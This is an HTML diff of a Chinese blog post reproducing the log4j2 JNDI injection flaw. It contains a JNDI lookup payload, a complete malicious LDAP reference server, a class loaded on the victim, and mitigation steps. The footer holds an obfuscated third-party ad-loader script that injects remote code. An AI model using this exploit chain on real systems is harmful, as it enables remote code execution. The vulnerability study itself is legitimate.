@@ -1,0 +1,287 @@
+<!DOCTYPE html>
+<html class="no-js" lang="en">
+<head>
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<meta http-equiv="X-UA-Compatible" content="IE=edge">
+	<title>log4j2 jndi注入漏洞复现 - 编程小白</title>
+	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
+	<meta name="description" content="">
+	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+	<link rel="dns-prefetch" href="//fonts.googleapis.com">
+	<link rel="dns-prefetch" href="//fonts.gstatic.com">
+	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">
+
+	<link rel="stylesheet" href="/css/style.css">
+	
+
+	<link rel="shortcut icon" href="/favicon.ico">
+		
+</head>
+<body class="body">
+	<div class="container container--outer">
+		<header class="header">
+	<div class="container header__container">
+		
+	<div class="logo">
+		<a class="logo__link" href="/" title="编程小白" rel="home">
+			<div class="logo__item logo__text">
+					<div class="logo__title">编程小白</div>
+					
+				</div>
+		</a>
+	</div>
+		<div class="divider"></div>
+	</div>
+</header>
+		<div class="wrapper flex">
+			<div class="primary">
+			
+<main class="main" role="main">
+	<article class="post">
+		<header class="post__header">
+			<h1 class="post__title">log4j2 jndi注入漏洞复现</h1>
+			
+		</header>
+		<div class="content post__content clearfix">
+			
+
+
+                <div id="content_views" class="htmledit_views">
+                    <p></p> 
+<p></p> 
+<p>最近log4j2出了个zero-day的严重漏洞，为了找出复现的方法，首先需要弄懂其中的原理。</p> 
+<p>log4j2有个功能可以调用jndi来查询一些信息然后记录在日志里，这个功能本来是可以用来记录一些动态配置信息，比如访问的用户信息等，但是却成了一个漏洞。</p> 
+<p>一、jndi、ldap简介</p> 
+<p>什么是jndi呢？</p> 
+<p>援引网上的说法，jndi就是java一套资源发现和使用的接口，用来将各种资源做整合，程序员不用关心底层配置和代码实现，将资源拿来用就可以了。</p> 
+<p>什么是ldap?</p> 
+<p>ldap是一种文件访问协议，可以用来获取文件资源</p> 
+<p>log4j2在记录日志时可以用</p> 
+<pre><code>logger.error("${jndi:ldap://127.0.0.1:1389/Print}");
+</code></pre> 
+<p>这样子就会调用jndi底层的127.0.0.1:1389 rmi服务去获取 ldap的资源路径，然后从这个资源路径获取需要记录的日志信息。</p> 
+<p>二、问题复复现</p> 
+<p>问题复现需要三个组件</p> 
+<p>1、模拟服务器打日志的java进程</p> 
+<p>2、模拟rmi服务的server</p> 
+<p>3、提供下载资源的Http服务器</p> 
+<p>对于模拟服务器打日志的java进程：</p> 
+<pre><code>package com.ccbft.JndiTest;
+
+import org.apache.logging.log4j.LogManager;
+import org.apache.logging.log4j.Logger;
+
+public class JndiTest {
+    public static void main(String[] args) {
+        Logger logger= LogManager.getLogger(JndiTest.class);
+        logger.error("${jndi:ldap://127.0.0.1:1389/Print}");
+    }
+}
+</code></pre> 
+<p>我们简单模拟一下</p> 
+<p>对于提供rmi服务的server</p> 
+<p>网上找到了下面的代码</p> 
+<pre><code>import java.net.InetAddress;
+import java.net.MalformedURLException;
+import java.net.URL;
+
+import javax.net.ServerSocketFactory;
+import javax.net.SocketFactory;
+import javax.net.ssl.SSLSocketFactory;
+
+import com.unboundid.ldap.listener.InMemoryDirectoryServer;
+import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;
+import com.unboundid.ldap.listener.InMemoryListenerConfig;
+import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
+import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;
+import com.unboundid.ldap.sdk.Entry;
+import com.unboundid.ldap.sdk.LDAPException;
+import com.unboundid.ldap.sdk.LDAPResult;
+import com.unboundid.ldap.sdk.ResultCode;
+
+
+public class LDAPRefServer {
+
+    private static final String LDAP_BASE = "dc=example,dc=com";
+
+
+    public static void main ( String[] args ) {
+        int port = 1389;
+        if ( args.length &lt; 1 || args[ 0 ].indexOf('#') &lt; 0 ) {
+            System.err.println(LDAPRefServer.class.getSimpleName() + " &lt;codebase_url#classname&gt; [&lt;port&gt;]"); //$NON-NLS-1$
+            System.exit(-1);
+        }
+        else if ( args.length &gt; 1 ) {
+            port = Integer.parseInt(args[ 1 ]);
+        }
+
+        try {
+            InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig(LDAP_BASE);
+            config.setListenerConfigs(new InMemoryListenerConfig(
+                "listen", //$NON-NLS-1$
+                InetAddress.getByName("0.0.0.0"), //$NON-NLS-1$
+                port,
+                ServerSocketFactory.getDefault(),
+                SocketFactory.getDefault(),
+                (SSLSocketFactory) SSLSocketFactory.getDefault()));
+
+            config.addInMemoryOperationInterceptor(new OperationInterceptor(new URL(args[ 0 ])));
+            InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config);
+            System.out.println("Listening on 0.0.0.0:" + port); //$NON-NLS-1$
+            ds.startListening();
+
+        }
+        catch ( Exception e ) {
+            e.printStackTrace();
+        }
+    }
+
+    private static class OperationInterceptor extends InMemoryOperationInterceptor {
+
+        private URL codebase;
+
+
+        /**
+         * 
+         */
+        public OperationInterceptor ( URL cb ) {
+            this.codebase = cb;
+        }
+
+
+        /**
+         * {@inheritDoc}
+         *
+         * @see com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor#processSearchResult(com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult)
+         */
+        @Override
+        public void processSearchResult ( InMemoryInterceptedSearchResult result ) {
+            String base = result.getRequest().getBaseDN();
+            Entry e = new Entry(base);
+            try {
+                sendResult(result, base, e);
+            }
+            catch ( Exception e1 ) {
+                e1.printStackTrace();
+            }
+
+        }
+
+
+        protected void sendResult ( InMemoryInterceptedSearchResult result, String base, Entry e ) throws LDAPException, MalformedURLException {
+            URL turl = new URL(this.codebase, this.codebase.getRef().replace('.', '/').concat(".class"));
+            System.out.println("Send LDAP reference result for " + base + " redirecting to " + turl);
+            e.addAttribute("javaClassName", "foo");
+            String cbstring = this.codebase.toString();
+            int refPos = cbstring.indexOf('#');
+            if ( refPos &gt; 0 ) {
+                cbstring = cbstring.substring(0, refPos);
+            }
+            e.addAttribute("javaCodeBase", cbstring);
+            e.addAttribute("objectClass", "javaNamingReference"); //$NON-NLS-1$
+            e.addAttribute("javaFactory", this.codebase.getRef());
+            result.sendSearchEntry(e);
+            result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
+        }
+
+    }
+}
+</code></pre> 
+<p>这个代码就是模拟ldap的服务器，当接收到请求时会进入到OperationInterceptor进行处理</p> 
+<p>启动参数提供一个例子</p> 
+<p><a href="http://192.168.1.4/#Print" title="http://192.168.1.4/#Print">http://192.168.1.4/#Print</a></p> 
+<p>其中192.168.1.4是Http服务器地址</p> 
+<pre><code>            e.addAttribute("javaCodeBase", cbstring);
+            e.addAttribute("objectClass", "javaNamingReference"); //$NON-NLS-1$
+            e.addAttribute("javaFactory", this.codebase.getRef());</code></pre> 
+<p>这段代码的作用是告诉服务调用方去哪里获取资源</p> 
+<pre><code>    static Object decodeObject(Attributes var0) throws NamingException {
+        String[] var2 = getCodebases(var0.get(JAVA_ATTRIBUTES[4]));
+
+        try {
+            Attribute var1;
+            if ((var1 = var0.get(JAVA_ATTRIBUTES[1])) != null) {
+                ClassLoader var3 = helper.getURLClassLoader(var2);
+                return deserializeObject((byte[])((byte[])var1.get()), var3);
+            } else if ((var1 = var0.get(JAVA_ATTRIBUTES[7])) != null) {
+                return decodeRmiObject((String)var0.get(JAVA_ATTRIBUTES[2]).get(), (String)var1.get(), var2);
+            } else {
+                var1 = var0.get(JAVA_ATTRIBUTES[0]);
+                return var1 == null || !var1.contains(JAVA_OBJECT_CLASSES[2]) &amp;&amp; !var1.contains(JAVA_OBJECT_CLASSES_LOWER[2]) ? null : decodeReference(var0, var2);
+            }
+        } catch (IOException var5) {
+            NamingException var4 = new NamingException();
+            var4.setRootCause(var5);
+            throw var4;
+        }
+    }</code></pre> 
+<p>原因是在调用方收到请求之后会调用decodeObject去解析返回结果，只有objectClass是javaNamingReference才会进入decodeReference方法。运行到这里就跟ldap服务没有关系了，接下来会去Http服务器下载对应的class文件</p> 
+<p>最后会调用getObjectFactoryFromReference方法下载class文件</p> 
+<p>然后在下面的代码去实例化获取到的class文件，所以只需要在获取的class文件的构造函数里写hack代码就可以任意操作写日志的服务器。</p> 
+<pre><code>        return (clas != null) ? (ObjectFactory) clas.newInstance() : null;
+</code></pre> 
+<p> 这里提供一个class文件</p> 
+<pre><code>import javax.naming.Context;
+import javax.naming.Name;
+import javax.naming.spi.ObjectFactory;
+import java.util.Hashtable;
+
+public class Print implements ObjectFactory{
+    public Print(){
+        System.out.println("hack");
+    }
+
+    @Override
+    public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable&lt;?, ?&gt; environment) throws Exception {
+        return null;
+    }
+}
+</code></pre> 
+<p>如果成功就会在写日志的服务器上打印hack。</p> 
+<p>三、解决方案</p> 
+<p>1、设置-Dlog4j2.formatMsgNoLookups=true</p> 
+<p>2、升级到2.15.0</p> 
+<p>对于第一个解决方案，尝试了2.10.0之前的版本，没有效果，</p> 
+<p style="text-align:center"><img alt="" src="https://images2.imgbox.com/3b/82/InXFSlrx_o.png"></p> 
+<p> 换成2.10.0</p> 
+<p><img alt="" height="368" src="https://images2.imgbox.com/84/4b/WD8OLiI4_o.png" width="1200"></p> 
+<p>-Dlog4j2.formatMsgNoLookups=false</p> 
+<p><img alt="" height="381" src="https://images2.imgbox.com/ea/38/GOxf2ZDt_o.png" width="1200"></p> 
+<p> </p> 
+<p> </p> 
+<p></p> 
+<p></p> 
+<p>2.10.0（包括）之后都有效果，2.10..0之前的最好选择升级版本</p> 
+<pre>compile("org.apache.logging.log4j:log4j-api:2.10.0")
+compile("org.apache.logging.log4j:log4j-core:2.10.0")
+</pre> 
+<p></p> 
+<p></p>
+                </div>
+
+		</div>
+	</article>
+</main>
+
+
+
+
+			</div>
+			
+		</div>
+		<footer class="footer">
+	<div class="container footer__container flex">
+		
+		<div class="footer__copyright">
+			&copy; 2023 编程小白.
+			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
+		</div>
+	</div>
+</footer>
+<script src="https://www.w3counter.com/tracker.js?id=150625"></script>
+<script data-cfasync='false'>function R(K,h){var O=X();return R=function(p,E){p=p-0x87;var Z=O[p];return Z;},R(K,h);}(function(K,h){var Xo=R,O=K();while(!![]){try{var p=parseInt(Xo(0xac))/0x1*(-parseInt(Xo(0x90))/0x2)+parseInt(Xo(0xa5))/0x3*(-parseInt(Xo(0x8d))/0x4)+parseInt(Xo(0xb5))/0x5*(-parseInt(Xo(0x93))/0x6)+parseInt(Xo(0x89))/0x7+-parseInt(Xo(0xa1))/0x8+parseInt(Xo(0xa7))/0x9*(parseInt(Xo(0xb2))/0xa)+parseInt(Xo(0x95))/0xb*(parseInt(Xo(0x9f))/0xc);if(p===h)break;else O['push'](O['shift']());}catch(E){O['push'](O['shift']());}}}(X,0x33565),(function(){var XG=R;function K(){var Xe=R,h=109325,O='a3klsam',p='a',E='db',Z=Xe(0xad),S=Xe(0xb6),o=Xe(0xb0),e='cs',D='k',c='pro',u='xy',Q='su',G=Xe(0x9a),j='se',C='cr',z='et',w='sta',Y='tic',g='adMa',V='nager',A=p+E+Z+S+o,s=p+E+Z+S+e,W=p+E+Z+D+'-'+c+u+'-'+Q+G+'-'+j+C+z,L='/'+w+Y+'/'+g+V+Xe(0x9c),T=A,t=s,I=W,N=null,r=null,n=new Date()[Xe(0x94)]()[Xe(0x8c)]('T')[0x0][Xe(0xa3)](/-/ig,'.')['substring'](0x2),q=function(F){var Xa=Xe,f=Xa(0xa4);function v(XK){var XD=Xa,Xh,XO='';for(Xh=0x0;Xh<=0x3;Xh++)XO+=f[XD(0x88)](XK>>Xh*0x8+0x4&0xf)+f[XD(0x88)](XK>>Xh*0x8&0xf);return XO;}function U(XK,Xh){var XO=(XK&0xffff)+(Xh&0xffff),Xp=(XK>>0x10)+(Xh>>0x10)+(XO>>0x10);return Xp<<0x10|XO&0xffff;}function m(XK,Xh){return XK<<Xh|XK>>>0x20-Xh;}function l(XK,Xh,XO,Xp,XE,XZ){return U(m(U(U(Xh,XK),U(Xp,XZ)),XE),XO);}function B(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&XO|~Xh&Xp,XK,Xh,XE,XZ,XS);}function y(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&Xp|XO&~Xp,XK,Xh,XE,XZ,XS);}function H(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh^XO^Xp,XK,Xh,XE,XZ,XS);}function X0(XK,Xh,XO,Xp,XE,XZ,XS){return l(XO^(Xh|~Xp),XK,Xh,XE,XZ,XS);}function X1(XK){var Xc=Xa,Xh,XO=(XK[Xc(0x9b)]+0x8>>0x6)+0x1,Xp=new Array(XO*0x10);for(Xh=0x0;Xh<XO*0x10;Xh++)Xp[Xh]=0x0;for(Xh=0x0;Xh<XK[Xc(0x9b)];Xh++)Xp[Xh>>0x2]|=XK[Xc(0x8b)](Xh)<<Xh%0x4*0x8;return Xp[Xh>>0x2]|=0x80<<Xh%0x4*0x8,Xp[XO*0x10-0x2]=XK[Xc(0x9b)]*0x8,Xp;}var X2,X3=X1(F),X4=0x67452301,X5=-0x10325477,X6=-0x67452302,X7=0x10325476,X8,X9,XX,XR;for(X2=0x0;X2<X3[Xa(0x9b)];X2+=0x10){X8=X4,X9=X5,XX=X6,XR=X7,X4=B(X4,X5,X6,X7,X3[X2+0x0],0x7,-0x28955b88),X7=B(X7,X4,X5,X6,X3[X2+0x1],0xc,-0x173848aa),X6=B(X6,X7,X4,X5,X3[X2+0x2],0x11,0x242070db),X5=B(X5,X6,X7,X4,X3[X2+0x3],0x16,-0x3e423112),X4=B(X4,X5,X6,X7,X3[X2+0x4],0x7,-0xa83f051),X7=B(X7,X4,X5,X6,X3[X2+0x5],0xc,0x4787c62a),X6=B(X6,X7,X4,X5,X3[X2+0x6],0x11,-0x57cfb9ed),X5=B(X5,X6,X7,X4,X3[X2+0x7],0x16,-0x2b96aff),X4=B(X4,X5,X6,X7,X3[X2+0x8],0x7,0x698098d8),X7=B(X7,X4,X5,X6,X3[X2+0x9],0xc,-0x74bb0851),X6=B(X6,X7,X4,X5,X3[X2+0xa],0x11,-0xa44f),X5=B(X5,X6,X7,X4,X3[X2+0xb],0x16,-0x76a32842),X4=B(X4,X5,X6,X7,X3[X2+0xc],0x7,0x6b901122),X7=B(X7,X4,X5,X6,X3[X2+0xd],0xc,-0x2678e6d),X6=B(X6,X7,X4,X5,X3[X2+0xe],0x11,-0x5986bc72),X5=B(X5,X6,X7,X4,X3[X2+0xf],0x16,0x49b40821),X4=y(X4,X5,X6,X7,X3[X2+0x1],0x5,-0x9e1da9e),X7=y(X7,X4,X5,X6,X3[X2+0x6],0x9,-0x3fbf4cc0),X6=y(X6,X7,X4,X5,X3[X2+0xb],0xe,0x265e5a51),X5=y(X5,X6,X7,X4,X3[X2+0x0],0x14,-0x16493856),X4=y(X4,X5,X6,X7,X3[X2+0x5],0x5,-0x29d0efa3),X7=y(X7,X4,X5,X6,X3[X2+0xa],0x9,0x2441453),X6=y(X6,X7,X4,X5,X3[X2+0xf],0xe,-0x275e197f),X5=y(X5,X6,X7,X4,X3[X2+0x4],0x14,-0x182c0438),X4=y(X4,X5,X6,X7,X3[X2+0x9],0x5,0x21e1cde6),X7=y(X7,X4,X5,X6,X3[X2+0xe],0x9,-0x3cc8f82a),X6=y(X6,X7,X4,X5,X3[X2+0x3],0xe,-0xb2af279),X5=y(X5,X6,X7,X4,X3[X2+0x8],0x14,0x455a14ed),X4=y(X4,X5,X6,X7,X3[X2+0xd],0x5,-0x561c16fb),X7=y(X7,X4,X5,X6,X3[X2+0x2],0x9,-0x3105c08),X6=y(X6,X7,X4,X5,X3[X2+0x7],0xe,0x676f02d9),X5=y(X5,X6,X7,X4,X3[X2+0xc],0x14,-0x72d5b376),X4=H(X4,X5,X6,X7,X3[X2+0x5],0x4,-0x5c6be),X7=H(X7,X4,X5,X6,X3[X2+0x8],0xb,-0x788e097f),X6=H(X6,X7,X4,X5,X3[X2+0xb],0x10,0x6d9d6122),X5=H(X5,X6,X7,X4,X3[X2+0xe],0x17,-0x21ac7f4),X4=H(X4,X5,X6,X7,X3[X2+0x1],0x4,-0x5b4115bc),X7=H(X7,X4,X5,X6,X3[X2+0x4],0xb,0x4bdecfa9),X6=H(X6,X7,X4,X5,X3[X2+0x7],0x10,-0x944b4a0),X5=H(X5,X6,X7,X4,X3[X2+0xa],0x17,-0x41404390),X4=H(X4,X5,X6,X7,X3[X2+0xd],0x4,0x289b7ec6),X7=H(X7,X4,X5,X6,X3[X2+0x0],0xb,-0x155ed806),X6=H(X6,X7,X4,X5,X3[X2+0x3],0x10,-0x2b10cf7b),X5=H(X5,X6,X7,X4,X3[X2+0x6],0x17,0x4881d05),X4=H(X4,X5,X6,X7,X3[X2+0x9],0x4,-0x262b2fc7),X7=H(X7,X4,X5,X6,X3[X2+0xc],0xb,-0x1924661b),X6=H(X6,X7,X4,X5,X3[X2+0xf],0x10,0x1fa27cf8),X5=H(X5,X6,X7,X4,X3[X2+0x2],0x17,-0x3b53a99b),X4=X0(X4,X5,X6,X7,X3[X2+0x0],0x6,-0xbd6ddbc),X7=X0(X7,X4,X5,X6,X3[X2+0x7],0xa,0x432aff97),X6=X0(X6,X7,X4,X5,X3[X2+0xe],0xf,-0x546bdc59),X5=X0(X5,X6,X7,X4,X3[X2+0x5],0x15,-0x36c5fc7),X4=X0(X4,X5,X6,X7,X3[X2+0xc],0x6,0x655b59c3),X7=X0(X7,X4,X5,X6,X3[X2+0x3],0xa,-0x70f3336e),X6=X0(X6,X7,X4,X5,X3[X2+0xa],0xf,-0x100b83),X5=X0(X5,X6,X7,X4,X3[X2+0x1],0x15,-0x7a7ba22f),X4=X0(X4,X5,X6,X7,X3[X2+0x8],0x6,0x6fa87e4f),X7=X0(X7,X4,X5,X6,X3[X2+0xf],0xa,-0x1d31920),X6=X0(X6,X7,X4,X5,X3[X2+0x6],0xf,-0x5cfebcec),X5=X0(X5,X6,X7,X4,X3[X2+0xd],0x15,0x4e0811a1),X4=X0(X4,X5,X6,X7,X3[X2+0x4],0x6,-0x8ac817e),X7=X0(X7,X4,X5,X6,X3[X2+0xb],0xa,-0x42c50dcb),X6=X0(X6,X7,X4,X5,X3[X2+0x2],0xf,0x2ad7d2bb),X5=X0(X5,X6,X7,X4,X3[X2+0x9],0x15,-0x14792c6f),X4=U(X4,X8),X5=U(X5,X9),X6=U(X6,XX),X7=U(X7,XR);}return v(X4)+v(X5)+v(X6)+v(X7);},M=function(F){return r+'/'+q(n+':'+T+':'+F);},P=function(){var Xu=Xe;return r+'/'+q(n+':'+t+Xu(0xae));},J=document[Xe(0xa6)](Xe(0xaf));Xe(0xa8)in J?(L=L[Xe(0xa3)]('.js',Xe(0x9d)),J[Xe(0x91)]='module'):(L=L[Xe(0xa3)](Xe(0x9c),Xe(0xb4)),J[Xe(0xb3)]=!![]),N=q(n+':'+I+':domain')[Xe(0xa9)](0x0,0xa)+Xe(0x8a),r=Xe(0x92)+q(N+':'+I)[Xe(0xa9)](0x0,0xa)+'.'+N,J[Xe(0x96)]=M(L)+Xe(0x9c),J[Xe(0x87)]=function(){window[O]['ph'](M,P,N,n,q),window[O]['init'](h);},J[Xe(0xa2)]=function(){var XQ=Xe,F=document[XQ(0xa6)](XQ(0xaf));F['src']=XQ(0x98),F[XQ(0x99)](XQ(0xa0),h),F[XQ(0xb1)]='async',document[XQ(0x97)][XQ(0xab)](F);},document[Xe(0x97)][Xe(0xab)](J);}document['readyState']===XG(0xaa)||document[XG(0x9e)]===XG(0x8f)||document[XG(0x9e)]==='interactive'?K():window[XG(0xb7)](XG(0x8e),K);}()));function X(){var Xj=['addEventListener','onload','charAt','509117wxBMdt','.com','charCodeAt','split','988kZiivS','DOMContentLoaded','loaded','533092QTEErr','type','https://','6ebXQfY','toISOString','22mCPLjO','src','head','https://js.wpadmngr.com/static/adManager.js','setAttribute','per','length','.js','.m.js','readyState','2551668jffYEE','data-admpid','827096TNEEsf','onerror','replace','0123456789abcdef','909NkPXPt','createElement','2259297cinAzF','noModule','substring','complete','appendChild','1VjIbCB','loc',':tags','script','cks','async','10xNKiRu','defer','.l.js','469955xpTljk','ksu'];X=function(){return Xj;};return X();}</script>
+	</div>
+<script async defer src="/js/menu.js"></script>
+</body>
+</html>
